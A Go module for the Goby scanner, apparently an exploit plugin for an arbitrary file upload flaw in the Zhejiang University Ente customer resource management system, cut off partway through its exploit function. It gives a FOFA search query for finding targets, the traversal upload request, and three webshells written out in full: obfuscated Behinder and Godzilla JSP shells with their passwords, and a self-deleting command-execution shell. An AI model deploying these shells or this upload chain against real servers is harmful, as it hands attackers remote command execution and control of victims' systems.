package exploits

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Zhejiang University Ente Customer Resource Management System /enterphone/../entsoft/CustomerAction.entphone File Upload Vulnerability",
    "Description": "<p>Zhejiang University Ente Customer Resource Management System is a professional customer relationship management software</p><p>There is an arbitrary file upload vulnerability in the customer resource management system of Zhejiang University Ente, which attackers can exploit/ Entsoft/customerAction. entphone uploads malicious files to achieve server control</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2024-04-16",
    "PostTime": "2024-04-18",
    "Author": "兰公子",
    "FofaQuery": "title=\"欢迎使用浙大恩特客户资源管理系统\" || body=\"script/Ent.base.js\"",
    "GobyQuery": "title=\"欢迎使用浙大恩特客户资源管理系统\" || body=\"script/Ent.base.js\"",
    "Level": "3",
    "Impact": "<p>Zhejiang University Ente Customer Resource Management System is a professional customer relationship management software</p><p>There is an arbitrary file upload vulnerability in the customer resource management system of Zhejiang University Ente, which attackers can exploit/ Entsoft/customerAction. entphone uploads malicious files to achieve server control</p>",
    "Recommendation": "<p>The manufacturer has temporarily released the latest version, please follow the latest news from the manufacturer</p><p><a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Behinder,Godzilla,Command,customize"
        },
        {
            "name": "Command",
            "type": "input",
            "value": "",
            "show": "mode=Command"
        },
        {
            "name": "customize",
            "type": "input",
            "value": "",
            "show": "mode=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/enterphone/../entsoft/CustomerAction.entphone?method=loadFile",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "iphone",
                    "Content-Type": "multipart/form-data; Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724"
                },
                "data_type": "text",
                "data": "-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(\"test\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test.jsp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filepath|lastbody|regex|(?:filepath\\\"\\:\\\")(.*?)(?:\\\"\\})",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/enterphone/../entsoft/CustomerAction.entphone?method=loadFile"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{filepath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 /enterphone/../entsoft/CustomerAction.entphone 文件上传漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是一款专业的客户关系管理软件</p><p>浙大恩特客户资源管理系统存在任意文件上传漏洞，攻击者可利用/enterphone/../entsoft/CustomerAction.entphone上传恶意文件，从而达到控制服务器的目的<br></p>",
            "Recommendation": "<p>厂商暂时发布最新版本，请用户关注厂商最新消息<a href=\"http://www.entersoft.cn/\" target=\"_blank\">http://www.entersoft.cn/</a></p>",
            "Impact": "<p>浙大恩特客户资源管理系统存在任意文件上传漏洞，攻击者可利用/enterphone/../entsoft/CustomerAction.entphone上传恶意文件，从而达到控制服务器的目的<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Zhejiang University Ente Customer Resource Management System /enterphone/../entsoft/CustomerAction.entphone File Upload Vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>Zhejiang University Ente Customer Resource Management System is a professional customer relationship management software</p><p>There is an arbitrary file upload vulnerability in the customer resource management system of Zhejiang University Ente, which attackers can exploit/ Entsoft/customerAction. entphone uploads malicious files to achieve server control</p>",
            "Recommendation": "<p>The manufacturer has temporarily released the latest version, please follow the latest news from the manufacturer<br></p><p><a href=\"http://www.entersoft.cn/\" target=\"_blank\">http://www.entersoft.cn/</a><br></p>",
            "Impact": "<p>Zhejiang University Ente Customer Resource Management System is a professional customer relationship management software</p><p>There is an arbitrary file upload vulnerability in the customer resource management system of Zhejiang University Ente, which attackers can exploit/ Entsoft/customerAction. entphone uploads malicious files to achieve server control</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	// 随机生成文件
	makeFileNameFasffBsswAA := func(fileType string) string {
		fileName := goutils.RandomHexString(16) + "." + fileType
		return fileName
	}

	//正则匹配(输入：表达式 , 内容)
	makeRegularFasffBsswAA := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestFasffBsswAA := regexp.MustCompile(RegularUrl)
		if !reRequestFasffBsswAA.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestFasffBsswAA.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	//GET请求构造(hostInfo , 请求url , header参数(map)(没有时置空))
	sendPayloadFlagGetFasffBsswAA := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		getRequestConfigFasffBsswAA := httpclient.NewGetRequestConfig(urlOfGet)
		getRequestConfigFasffBsswAA.VerifyTls = false
		getRequestConfigFasffBsswAA.FollowRedirect = false
		if getHeaderMap != nil {
			for postHeaderKey, postHeaderValue := range getHeaderMap {
				getRequestConfigFasffBsswAA.Header.Store(postHeaderKey, postHeaderValue)
			}
		}
		return httpclient.DoHttpRequest(hostInfo, getRequestConfigFasffBsswAA)
	}

	// POST请求构造(hostInfo , 请求url , data参数 , header参数(map)(没有时置空))
	sendPayloadFlagPostFasffBsswAA := func(hostInfo *httpclient.FixUrl, urlOfPost string, dataOfPost string, postHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		postRequestConfigFasffBsswAA := httpclient.NewPostRequestConfig(urlOfPost)
		postRequestConfigFasffBsswAA.VerifyTls = false
		postRequestConfigFasffBsswAA.FollowRedirect = false
		if postHeaderMap != nil {
			for postHeaderKey, postHeaderValue := range postHeaderMap {
				postRequestConfigFasffBsswAA.Header.Store(postHeaderKey, postHeaderValue)
			}
		}
		postRequestConfigFasffBsswAA.Data = dataOfPost
		return httpclient.DoHttpRequest(hostInfo, postRequestConfigFasffBsswAA)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//结构体
			type Result struct {
				ResultOfType       string
				ResultOfMap        map[string]string
				ResultOfUrl        string
				ResultOfData       string
				ResultOfRegular    string
				ResultOfRegularALL string
			}
			//创建结构体数组
			ResultAllData := []Result{}

			//变量获取
			mode := goutils.B2S(ss.Params["mode"])
			customize := goutils.B2S(ss.Params["customize"])
			command := goutils.B2S(ss.Params["Command"])

			//变量设置
			//模板参数使用：
			//{{{filename}}}：filename(文件名)
			//{{{content}}}: contentXXXX(文件内容)
			//{{{Regular}}}：ResultOfRegular(正则结果)
			//{{{RegularALL}}}：ResultOfRegularALL(正则结果)
			//结构体数组使用
			//使用append添加请求包数量与信息

			//上传的文件类型
			filetype := `jsp`
			//冰蝎马
			contentBehinder := `<%@page import="\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.*"%><%!\u0063\u006c\u0061\u0073\u0073 \u0055 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0055(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u0063){\u0073\u0075\u0070\u0065\u0072(\u0063);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0067(\u0062\u0079\u0074\u0065 []\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0062,\u0030,\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);}}%><%\u0069\u0066 (\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064().\u0065\u0071\u0075\u0061\u006c\u0073("\u0050\u004f\u0053\u0054")){\u0053\u0074\u0072\u0069\u006e\u0067 \u006b="\u0065\u0034\u0035\u0065\u0033\u0032\u0039\u0066\u0065\u0062\u0035\u0064\u0039\u0032\u0035\u0062";\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065("\u0075",\u006b);\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u0032,\u006e\u0065\u0077 \u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u006b.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			//哥斯拉马
			contentGodzilla := `<%! \u0053\u0074\u0072\u0069\u006e\u0067 \u0078\u0063="\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061"; \u0053\u0074\u0072\u0069\u006e\u0067 \u0070\u0061\u0073\u0073="\u0070\u0061\u0073\u0073"; \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035=\u006d\u0064\u0035(\u0070\u0061\u0073\u0073+\u0078\u0063); \u0063\u006c\u0061\u0073\u0073 \u0058 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0070\u0075\u0062\u006c\u0069\u0063 \u0058(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u007a){\u0073\u0075\u0070\u0065\u0072(\u007a);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0051(\u0062\u0079\u0074\u0065[] \u0063\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0063\u0062, \u0030, \u0063\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);} }\u0070\u0075\u0062\u006c\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0078(\u0062\u0079\u0074\u0065[] \u0073,\u0062\u006f\u006f\u006c\u0065\u0061\u006e \u006d){ \u0074\u0072\u0079{\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u006d?\u0031:\u0032,\u006e\u0065\u0077 \u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u0078\u0063.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));\u0072\u0065\u0074\u0075\u0072\u006e \u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u0073); }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){\u0072\u0065\u0074\u0075\u0072\u006e \u006e\u0075\u006c\u006c; }} \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035(\u0053\u0074\u0072\u0069\u006e\u0067 \u0073) {\u0053\u0074\u0072\u0069\u006e\u0067 \u0072\u0065\u0074 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074 \u006d;\u006d = \u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u004d\u0044\u0035");\u006d.\u0075\u0070\u0064\u0061\u0074\u0065(\u0073.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(), \u0030, \u0073.\u006c\u0065\u006e\u0067\u0074\u0068());\u0072\u0065\u0074 = \u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u006d\u0061\u0074\u0068.\u0042\u0069\u0067\u0049\u006e\u0074\u0065\u0067\u0065\u0072(\u0031, \u006d.\u0064\u0069\u0067\u0065\u0073\u0074()).\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067(\u0031\u0036).\u0074\u006f\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065();} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {}\u0072\u0065\u0074\u0075\u0072\u006e \u0072\u0065\u0074; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0062\u0079\u0074\u0065[] \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0053\u0074\u0072\u0069\u006e\u0067 \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065\u0054\u006f\u0053\u0074\u0072\u0069\u006e\u0067", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0062\u0079\u0074\u0065[] \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; }%><%\u0074\u0072\u0079{\u0062\u0079\u0074\u0065[] \u0064\u0061\u0074\u0061=\u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072(\u0070\u0061\u0073\u0073));\u0064\u0061\u0074\u0061=\u0078(\u0064\u0061\u0074\u0061, \u0066\u0061\u006c\u0073\u0065);\u0069\u0066 (\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")==\u006e\u0075\u006c\u006c){\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064",\u006e\u0065\u0077 \u0058(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0051(\u0064\u0061\u0074\u0061));}\u0065\u006c\u0073\u0065{\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073",\u0064\u0061\u0074\u0061);\u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d \u0061\u0072\u0072\u004f\u0075\u0074=\u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d();\u004f\u0062\u006a\u0065\u0063\u0074 \u0066=((\u0043\u006c\u0061\u0073\u0073)\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065();\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0061\u0072\u0072\u004f\u0075\u0074);\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0030,\u0031\u0036));\u0066.\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067();\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0078(\u0061\u0072\u0072\u004f\u0075\u0074.\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079(), \u0074\u0072\u0075\u0065)));\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0031\u0036));} }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){}
%>`
			//命令执行马
			contentCommand := `<%@ page import="java.util.Base64"%><%String a=request.getParameter("cmd");if(a!=null&&!a.isEmpty()){String b=new String(Base64.getDecoder().decode(a));if(b!=null){Process c=Runtime.getRuntime().exec(b);java.util.Scanner d=new java.util.Scanner(c.getInputStream()).useDelimiter("\\A");String e=d.hasNext()?d.next():"";String f=Base64.getEncoder().encodeToString(e.getBytes());out.println(f);java.io.File g=new java.io.File(application.getRealPath(request.getServletPath()));g.delete();}}%>`
			//命令执行是否base64加密
			isBase64 := true
			//文件上传访问地址
			ResultAllURL := `{{{Regular}}}`
			//冰蝎输出模板
			BehinderText := "Password: rebeyond \nWebShell tool: Behinder \n"
			//哥斯拉输出模板
			GodzillaText := "加密器: JAVA_AES_BASE64 \n密码(Password): pass  向量(Key): key \n类型(WebShell tool): Godzilla v4.1\n"
			//添加请求包
			Result1 := Result{
				//POST or GET
				ResultOfType: `POST`,
				//请求头
				ResultOfMap: map[string]string{"User-Agent": "iphone", "Content-Type": "multipart/form-data; Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724"},
				//请求URL
				ResultOfUrl: `/enterphone/../entsoft/CustomerAction.entphone?method=loadFile`,
				//请求体
				ResultOfData: "-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"{{{filename}}}\"\r\nContent-Type: application/octet-stream\r\n\r\n{{{content}}}\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--",
				//正则表达式(每一个包的正则结果只作用于下一个包，除非放入全局结果区)
				ResultOfRegular: `filepath":"(.*?)"}`,
				//正则表达式(存入全局结果区,Cookie替换只支持这个)
				ResultOfRegularALL: ``,
			}

